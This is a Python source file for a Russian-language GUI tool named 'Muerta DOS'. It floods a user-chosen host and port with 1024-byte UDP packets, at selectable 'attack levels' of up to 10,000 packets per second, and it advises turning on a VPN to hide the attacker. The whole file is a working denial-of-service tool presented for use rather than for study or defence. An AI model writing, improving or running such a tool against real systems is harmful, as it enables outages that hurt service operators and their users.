import os
import socket
import threading
import time
import signal
import sys
import tkinter as tk
from tkinter import messagebox, StringVar
from PIL import Image, ImageTk
import re

from PIL.ImageTk import PhotoImage

# ANSI-коды для цветного текста
RED = "\033[91m"
RESET = "\033[0m"

class PacketSenderApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Muerta DOS")
        self.root.geometry("1100x900")
        self.root.configure(bg="#000000")
        self.root.option_add("*Font", "Inter")

        # Получаем путь к директории, где находится исполняемый файл
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

        # Используем правильный путь для иконки
        icon_path = os.path.join(base_path, 'icon.png')
        self.root.iconphoto(False, PhotoImage(file=icon_path))

        # Загружаем изображение
        image_path = os.path.join(base_path, 'image.png')
        self.image = Image.open(image_path)
        self.image = self.image.resize((1100, 200), Image.LANCZOS)
        self.photo_image = ImageTk.PhotoImage(self.image)
        self.image_label = tk.Label(root, image=self.photo_image, bg="#121212")
        self.image_label.pack(pady=10)

        self.target_entry = tk.Entry(root, width=30, bg="#212121", fg="white", bd=0, font=("Inter", 16), relief="flat")
        self.target_entry.insert(0, "Введите url адрес")
        self.target_entry.bind("<FocusIn>", self.clear_placeholder)
        self.target_entry.pack(pady=20, padx=12, ipady=6)

        self.port_entry = tk.Entry(root, width=30, bg="#212121", fg="white", bd=0, font=("Inter", 16), relief="flat")
        self.port_entry.insert(0, "Введите открытый порт")
        self.port_entry.bind("<FocusIn>", self.clear_placeholder)
        self.port_entry.pack(pady=20, padx=12, ipady=6)

        self.attack_level = StringVar(root)
        self.attack_level.set("Выберите уровень атаки")

        self.attack_level_dropdown = tk.OptionMenu(root, self.attack_level,
            "Слабая атака",
            "Средняя атака",
            "Сильная атака",
            "Ультра атака")
        self.attack_level_dropdown.config(bg="#212121", fg="white", bd=0, font=("Inter", 16), highlightthickness=0)
        self.attack_level_dropdown["menu"].config(bg="#212121", fg="white")
        self.attack_level_dropdown.pack(pady=20, padx=12)

        button_frame = tk.Frame(root, bg="#121212")
        button_frame.pack(pady=20)

        self.start_button = tk.Button(button_frame, text="Начать", command=self.start_sending, bg="#E32828", fg="white", bd=0,
                                       width=20, height=1, font=("Inter", 18), relief="flat", borderwidth=0)
        self.start_button.pack(side=tk.LEFT, padx=10)

        self.stop_button = tk.Button(button_frame, text="Остановить", command=self.stop_sending, bg="#E32828", fg="white", bd=0,
                                      width=20, height=1, font=("Inter", 18), relief="flat", borderwidth=0)
        self.stop_button.pack(side=tk.LEFT, padx=10)

        self.warning_text = tk.Label(root,
                                     text="ВНИМАНИЕ! Ультра атака может сильно нагрузить компьютер и программа может вылететь! \nРекомендуем включить VPN",
                                     bg="#080808", fg="yellow", font=("Inter", 16))
        self.warning_text.pack(pady=10)

        self.log_text = tk.Text(root, bg="#212121", fg="white", height=20, width=60, bd=0, font=("Inter", 10), relief="flat")
        self.log_text.pack(pady=20, padx=12)

        self.is_sending = False
        self.packets_per_second = 20
        self.stop_event = threading.Event()

        signal.signal(signal.SIGINT, self.signal_handler)

    def clear_placeholder(self, event):
        event.widget.delete(0, tk.END)
        event.widget.bind("<FocusIn>", lambda e: None)

    def signal_handler(self, sig, frame):
        self.stop_sending()
        sys.exit(0)

    def send_packets(self, target_ip, target_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)

        large_packet = b'A' * 1024
        packet_count = 0

        while not self.stop_event.is_set():  # Check the event to stop
            try:
                sock.sendto(large_packet, (target_ip, target_port))
                packet_count += 1
                log_message = f"{RED}Тяжелый пакет отправлен на {target_ip}:{target_port} (Всего отправлено: {packet_count}){RESET}\n"
                self.log_text.insert(tk.END, log_message)  # Обновляем текстовый лог
                self.log_text.see(tk.END)
                time.sleep(1 / self.packets_per_second)
            except socket.error as e:
                log_message = f"Ошибка: {e}\n"
                self.log_text.insert(tk.END, log_message)  # Обновляем текстовый лог об ошибке
                self.log_text.see(tk.END)
                time.sleep(2)

    def start_sending(self):
        target = self.target_entry.get().strip()
        port = self.port_entry.get().strip()

        selected_attack_level = self.attack_level.get()
        if selected_attack_level == "Слабая атака":
            self.packets_per_second = 5
        elif selected_attack_level == "Средняя атака":
            self.packets_per_second = 300
        elif selected_attack_level == "Сильная атака":
            self.packets_per_second = 1000
        elif selected_attack_level == "Ультра атака":
            self.packets_per_second = 10000
        else:
            messagebox.showerror("Ошибка", "Пожалуйста, выберите уровень атаки.")
            return

        normalized_target = self.normalize_url(target)
        if normalized_target is None:
            messagebox.showerror("Ошибка", "Не удалось разрешить указанный URL или IP адрес. Проверьте правильность ввода.")
            return

        try:
            target_ip = socket.gethostbyname(normalized_target)
            self.log_text.insert(tk.END, f"IP адрес для {normalized_target}: {target_ip}\n")
            self.log_text.see(tk.END)
        except socket.gaierror:
            messagebox.showerror("Ошибка", "Не удалось разрешить указанный URL или IP адрес. Проверьте правильность ввода.")
            return

        self.is_sending = True
        self.stop_event.clear()  # Clear the stop event
        self.log_text.insert(tk.END, f"Начинаем отправку тяжелых пакетов на {target_ip}:{port}...\n")
        self.log_text.see(tk.END)

        self.send_thread = threading.Thread(target=self.send_packets, args=(target_ip, int(port)))
        self.send_thread.daemon = True  # Set the thread as a daemon
        self.send_thread.start()

    def stop_sending(self):
        self.stop_event.set()  # Set the stop event
        if hasattr(self, 'send_thread') and self.send_thread.is_alive():
            self.send_thread.join()  # Wait for the thread to finish
        self.log_text.insert(tk.END, "Отправка остановлена.\n")
        self.log_text.see(tk.END)

    def normalize_url(self, url):
        url_pattern = r'^(http://|https://)?(www\.)?([a-zA-Z0-9-]+\.[a-zA-Z]{2,}|(\d{1,3}\.){3}\d{1,3})/?$'
        if re.match(url_pattern, url):
            return url
        else:
            return None

if __name__ == "__main__":
    root = tk.Tk()
    app = PacketSenderApp(root)
    root.mainloop()
